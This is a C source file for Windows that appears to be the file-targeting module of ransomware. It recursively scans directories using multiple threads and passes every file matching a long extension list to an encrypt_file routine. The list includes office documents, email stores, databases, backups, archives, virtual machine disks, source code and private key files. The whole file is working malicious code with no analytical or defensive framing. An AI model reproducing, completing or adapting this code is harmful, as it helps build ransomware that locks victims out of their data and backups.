#include "headers.h"
#include <Windows.h>
#include "dirent.h"

INT start_dirscan(dirscan_config_t *config);
DWORD WINAPI dirscan_threadproc(LPVOID lpParam);
INT dirscan_recurse(dirscan_config_t *config);
VOID file_handler(CONST CHAR * filepath);
INT start_dirscan(dirscan_config_t *config) {
	HANDLE *dirscan_threads = NULL;
	INT dirscan_directory_count = 0;
	dirscan_config_t *dirscan_configs = NULL;

	DIR *fDir = opendir(config->path);
	if (fDir == 0) {
		return(1);
	}
	dirscan_configs = HeapAlloc(GetProcessHeap(), 0, sizeof(dirscan_config_t));
	if (dirscan_configs == NULL) {
		return(2);
	}
	struct dirent * fDirent;
	CHAR fullpath[MAX_PATH];

	while ((fDirent = readdir(fDir)) != NULL) {
		if (StrCmpA(fDirent->d_name, ".") == 0 || StrCmpA(fDirent->d_name, "..") == 0) {
			continue;
		}
		StrCpyA(fullpath, config->path);
		StrCatA(fullpath, fDirent->d_name);
		if (fDirent->d_type == DT_DIR) {
			dirscan_directory_count++;
			dirscan_configs = HeapReAlloc(GetProcessHeap(), 0, dirscan_configs, sizeof(dirscan_config_t) * dirscan_directory_count);
			if (dirscan_configs == NULL) {
				return 0;
			}
			_memcpy(&dirscan_configs[dirscan_directory_count - 1], config, sizeof(dirscan_config_t));
			if (dirscan_configs == NULL) {
				return 0;
			}
			StrCpyA(&dirscan_configs[dirscan_directory_count - 1].path[0], fullpath);
			StrCatA(&dirscan_configs[dirscan_directory_count - 1].path[0], "\\");
			dirscan_configs[dirscan_directory_count - 1].depth++;
		}
		else if (fDirent->d_type == DT_REG) {
		
			file_handler(fullpath);
		}
	}

	closedir(fDir);

	dirscan_threads = HeapAlloc(GetProcessHeap(), 0, sizeof(HANDLE) * dirscan_directory_count);
	if (dirscan_threads == NULL) {
		if (dirscan_configs != NULL)
			HeapFree(GetProcessHeap(), 0, dirscan_configs);

		return(3);
	}

	for (INT i = 0; i < dirscan_directory_count; i++) {
		dirscan_threads[i] = CreateThread(NULL, 0, dirscan_threadproc, (LPVOID)&dirscan_configs[i], 0, NULL);

		if (dirscan_threads[i] == NULL) {
			Sleep(100);
		}
	}
	WaitForMultipleObjects(dirscan_directory_count, dirscan_threads, TRUE, INFINITE);
	if (dirscan_configs != NULL)
		HeapFree(GetProcessHeap(), 0, dirscan_configs);

	if (dirscan_threads != NULL) {
		for (INT i = 0; i < dirscan_directory_count; i++)
			CloseHandle(dirscan_threads[i]);

		HeapFree(GetProcessHeap(), 0, dirscan_threads);
		return 0;
	}

	return(0);
}

DWORD WINAPI dirscan_threadproc(LPVOID lpParam) {
	dirscan_config_t *config = (dirscan_config_t *)lpParam;
	dirscan_recurse(config);
	return(0);
}

INT dirscan_recurse(dirscan_config_t *config) {
	if (config->depth > config->max_depth)
		return(0 + 1);

	DIR *fDir = opendir(config->path);
	if (fDir == 0) {
		return(0 + 2);
	}

	dirscan_config_t search_config;
	_memcpy(&search_config, config, sizeof(dirscan_config_t));
	search_config.depth++;


	struct dirent * fDirent;

	while ((fDirent = readdir(fDir)) != NULL) {
		if ((StrCmpA(fDirent->d_name, ".") == 0) || (StrCmpA(fDirent->d_name, "..") == 0)) {
			continue;
		}
		StrCpyA(search_config.path, config->path);
		StrCatA(search_config.path, fDirent->d_name);

		if (fDirent->d_type == DT_DIR) {
			StrCatA(search_config.path, "\\");
			dirscan_recurse(&search_config);
		}
		else if (fDirent->d_type == DT_REG) {
			file_handler(search_config.path);
		}
	}

	closedir(fDir);

	return(0);
}
CHAR *get_filename_ext(CONST CHAR *filename)
{
	CHAR* f = filename + stupid_strlen(filename);

	while (1) {
		if (*f == '.') {
			break;
		}

		if (f == filename) {
			f = NULL;
			break;
		}

		f -= 1;
	}

	if (f == NULL) return "";
	return f + 1;
}

VOID file_handler(CONST CHAR * filepath)
{

	//MessageBox(NULL , filepath, "!!!", MB_ICONERROR);

	DWORD access;
	access =  GetFileAttributes(filepath);
	if (access == INVALID_FILE_ATTRIBUTES) {
		
		return;
	}
	CHAR * file_ext = get_filename_ext(filepath);


	if (StrCmp(file_ext, "doc") == 0 ||
		StrCmp(file_ext, "docx") == 0 ||
		StrCmp(file_ext, "xls") == 0 ||
		StrCmp(file_ext, "xlsx") == 0 ||
		StrCmp(file_ext, "ppt") == 0 ||
		StrCmp(file_ext, "pptx") == 0 ||
		StrCmp(file_ext, "pst") == 0 ||
		StrCmp(file_ext, "ost") == 0 ||
		StrCmp(file_ext, "msg") == 0 || StrCmp(file_ext, "eml") == 0 ||
		StrCmp(file_ext, "vsd") == 0 || StrCmp(file_ext, "vsdx") == 0 || StrCmp(file_ext, "txt") == 0 || StrCmp(file_ext, "csv") == 0 ||
		StrCmp(file_ext, "rtf") == 0 || StrCmp(file_ext, "123") == 0 || StrCmp(file_ext, "wks") == 0 || StrCmp(file_ext, "wk1") == 0 || StrCmp(file_ext, "pdf") == 0 ||
		StrCmp(file_ext, "dwg") == 0 || StrCmp(file_ext, "onetoc2") == 0 || StrCmp(file_ext, "snt") == 0 || StrCmp(file_ext, "jpeg") == 0 || StrCmp(file_ext, "jpg") == 0 ||
		StrCmp(file_ext, "docb") == 0 || StrCmp(file_ext, "docm") == 0 || StrCmp(file_ext, "dot") == 0 || StrCmp(file_ext, "dotm") == 0 || StrCmp(file_ext, "dotx") == 0 ||
		StrCmp(file_ext, "xlsm") == 0 || StrCmp(file_ext, "xlsb") == 0 || StrCmp(file_ext, "xlw") == 0 || StrCmp(file_ext, "xlt") == 0 ||
		StrCmp(file_ext, "xlm") == 0 || StrCmp(file_ext, "xlc") == 0 || StrCmp(file_ext, "xltx") == 0 || StrCmp(file_ext, "xltm") == 0 || StrCmp(file_ext, "pptm") == 0 ||
		StrCmp(file_ext, "pot") == 0 || StrCmp(file_ext, "pps") == 0 || StrCmp(file_ext, "ppsm") == 0 || StrCmp(file_ext, "ppsx") == 0 || StrCmp(file_ext, "ppam") == 0 ||
		StrCmp(file_ext, "potx") == 0 || StrCmp(file_ext, "potm") == 0 || StrCmp(file_ext, "edb") == 0 || StrCmp(file_ext, "hwp") == 0 || StrCmp(file_ext, "602") == 0 ||
		StrCmp(file_ext, "sxi") == 0 || StrCmp(file_ext, "sti") == 0 || StrCmp(file_ext, "sldx") == 0 || StrCmp(file_ext, "sldm") == 0 || StrCmp(file_ext, "sldm") == 0 ||
		StrCmp(file_ext, "vdi") == 0 || StrCmp(file_ext, "vmdk") == 0 || StrCmp(file_ext, "vmx") == 0 || StrCmp(file_ext, "gpg") == 0 || StrCmp(file_ext, "aes") == 0 ||
		StrCmp(file_ext, "ARC") == 0 || StrCmp(file_ext, "PAQ") == 0 || StrCmp(file_ext, "bz2") == 0 || StrCmp(file_ext, "tbk") == 0 || StrCmp(file_ext, "bak") == 0 ||
		StrCmp(file_ext, "tar") == 0 || StrCmp(file_ext, "tgz") == 0 || StrCmp(file_ext, "gz") == 0 || StrCmp(file_ext, "7z") == 0 || StrCmp(file_ext, "rar") == 0 ||
		StrCmp(file_ext, "zip") == 0 || StrCmp(file_ext, "backup") == 0 || StrCmp(file_ext, "iso") == 0 || StrCmp(file_ext, "vcd") == 0 || StrCmp(file_ext, "bmp") == 0 ||
		StrCmp(file_ext, "png") == 0 || StrCmp(file_ext, "gif") == 0 || StrCmp(file_ext, "raw") == 0 || StrCmp(file_ext, "cgm") == 0 || StrCmp(file_ext, "tif") == 0 ||
		StrCmp(file_ext, "tiff") == 0 || StrCmp(file_ext, "nef") == 0 || StrCmp(file_ext, "psd") == 0 || StrCmp(file_ext, "ai") == 0 || StrCmp(file_ext, "svg") == 0 ||
		StrCmp(file_ext, "djvu") == 0 || StrCmp(file_ext, "m4u") == 0 || StrCmp(file_ext, "m3u") == 0 || StrCmp(file_ext, "mid") == 0 || StrCmp(file_ext, "wma") == 0 ||
		StrCmp(file_ext, "flv") == 0 || StrCmp(file_ext, "3g2") == 0 || StrCmp(file_ext, "mkv") == 0 || StrCmp(file_ext, "3gp") == 0 || StrCmp(file_ext, "mp4") == 0 ||
		StrCmp(file_ext, "mov") == 0 || StrCmp(file_ext, "avi") == 0 || StrCmp(file_ext, "asf") == 0 || StrCmp(file_ext, "mpeg") == 0 || StrCmp(file_ext, "vob") == 0 ||
		StrCmp(file_ext, "mpg") == 0 || StrCmp(file_ext, "wmv") == 0 || StrCmp(file_ext, "fla") == 0 || StrCmp(file_ext, "swf") == 0 || StrCmp(file_ext, "wav") == 0 ||
		StrCmp(file_ext, "mp3") == 0 || StrCmp(file_ext, "sh") == 0 || StrCmp(file_ext, "class") == 0 || StrCmp(file_ext, "jar") == 0 || StrCmp(file_ext, "java") == 0 ||
		StrCmp(file_ext, "rb") == 0 || StrCmp(file_ext, "asp") == 0 || StrCmp(file_ext, "php") == 0 || StrCmp(file_ext, "jsp") == 0 || StrCmp(file_ext, "brd") == 0 || StrCmp(file_ext, "sch") == 0 ||
		StrCmp(file_ext, "dch") == 0 || StrCmp(file_ext, "dip") == 0 || StrCmp(file_ext, "pl") == 0 ||
		StrCmp(file_ext, "vb") == 0 || StrCmp(file_ext, "vbs") == 0 ||
		StrCmp(file_ext, "ps1") == 0 ||
		StrCmp(file_ext, "bat") == 0 || StrCmp(file_ext, "cmd") == 0 || StrCmp(file_ext, "js") == 0 || StrCmp(file_ext, "asm") == 0 || StrCmp(file_ext, "h") == 0 ||
		StrCmp(file_ext, "pas") == 0 || StrCmp(file_ext, "cpp") == 0 || StrCmp(file_ext, "c") == 0 || StrCmp(file_ext, "cs") == 0 || StrCmp(file_ext, "suo") == 0 || StrCmp(file_ext, "sln") == 0 ||
		StrCmp(file_ext, "ldf") == 0 || StrCmp(file_ext, "mdf") == 0 || StrCmp(file_ext, "ibd") == 0 || StrCmp(file_ext, "myi") == 0 || StrCmp(file_ext, "myd") == 0 || StrCmp(file_ext, "frm") == 0 ||
		StrCmp(file_ext, "odb") == 0 || StrCmp(file_ext, "dbf") == 0 || StrCmp(file_ext, "db") == 0 || StrCmp(file_ext, "mdb") == 0 || StrCmp(file_ext, "accdb") == 0 ||
		StrCmp(file_ext, "sql") == 0 ||
		StrCmp(file_ext, "sqlitedb") == 0 || StrCmp(file_ext, "sqlite3") == 0 || StrCmp(file_ext, "asc") == 0 || StrCmp(file_ext, "lay6") == 0 || StrCmp(file_ext, "lay") == 0 ||
		StrCmp(file_ext, "mml") == 0 || StrCmp(file_ext, "sxm") == 0 || StrCmp(file_ext, "otg") == 0 || StrCmp(file_ext, "odg") == 0 || StrCmp(file_ext, "uop") == 0 ||
		StrCmp(file_ext, "std") == 0 || StrCmp(file_ext, "sxd") == 0 || StrCmp(file_ext, "otp") == 0 || StrCmp(file_ext, "odp") == 0 ||
		StrCmp(file_ext, "wb2") == 0 || StrCmp(file_ext, "slk") == 0 || StrCmp(file_ext, "dif") == 0 || StrCmp(file_ext, "stc") == 0 || StrCmp(file_ext, "sxc") == 0 ||
		StrCmp(file_ext, "ots") == 0 ||
		StrCmp(file_ext, "ods") == 0 || StrCmp(file_ext, "3dm") == 0 || StrCmp(file_ext, "max") == 0 || StrCmp(file_ext, "3ds") == 0 || StrCmp(file_ext, "uot") == 0 ||
		StrCmp(file_ext, "stw") == 0 || StrCmp(file_ext, "sxw") == 0 || StrCmp(file_ext, "ott") == 0 || StrCmp(file_ext, "odt") == 0 || StrCmp(file_ext, "pem") == 0 ||
		StrCmp(file_ext, "p12") == 0 || StrCmp(file_ext, "csr") == 0 || StrCmp(file_ext, "crt") == 0 || StrCmp(file_ext, "key") == 0 || StrCmp(file_ext, "pfx") == 0 || StrCmp(file_ext, "der") == 0) {
		encrypt_file(filepath, 1);
		//MessageBox(0, filepath, "1", MB_USERICON);
	}
}
